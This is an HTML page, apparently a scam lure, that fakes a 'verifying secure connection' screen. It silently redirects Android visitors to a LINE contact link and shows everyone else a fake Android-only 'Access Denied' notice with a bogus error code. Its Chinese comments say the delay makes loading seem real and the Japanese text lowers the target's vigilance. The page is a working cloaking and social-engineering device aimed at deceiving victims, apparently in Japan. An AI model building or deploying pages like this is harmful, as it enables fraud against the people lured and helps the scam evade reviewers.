<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        window.onload = function() {
            var ua = navigator.userAgent.toLowerCase();
            
            // 判定是否为安卓设备 (Android)
            if (ua.indexOf("android") > -1) {
                setTimeout(function() {
                    // 使用 replace 效果更好，不留历史记录
                    window.location.replace("https://line.me/ti/p/taQRTaC99Y");
                }, 800); // 稍微延长到0.8秒，加载感更真实
            } else {
                // 非安卓用户看到的页面：增加了日语说明，降低对方警惕性
                document.body.innerHTML = `
                    <div style='text-align:center;padding:20px;margin-top:100px;font-family:sans-serif;'>
                        <h2 style='color:#333;'>Access Denied</h2>
                        <p style='color:#666;'>Sorry, this secure link is optimized for <b>Android</b> devices only.</p>
                        <p style='color:#999;font-size:14px;'>お使いの端末はこのリンクに対応していません。<br>Android端末から再度お試しください。</p>
                        <p style='color:#ccc;font-size:12px;margin-top:30px;'>Error Code: Auth_Verify_0x2026</p>
                    </div>`;
            }
        };
    </script>
</head>
<body style="font-family:sans-serif; background-color:#f8f9fa;">
    <div style="text-align: center; margin-top: 150px;">
        <p style="color:#5f6368; font-size:18px;">Verifying secure connection...</p>
        <p style="color:#999; font-size:12px;">安全な接続を確認中...</p>
        <div style="margin:20px auto; width:30px; height:30px; border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; animation:spin 1s linear infinite;"></div>
    </div>
    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
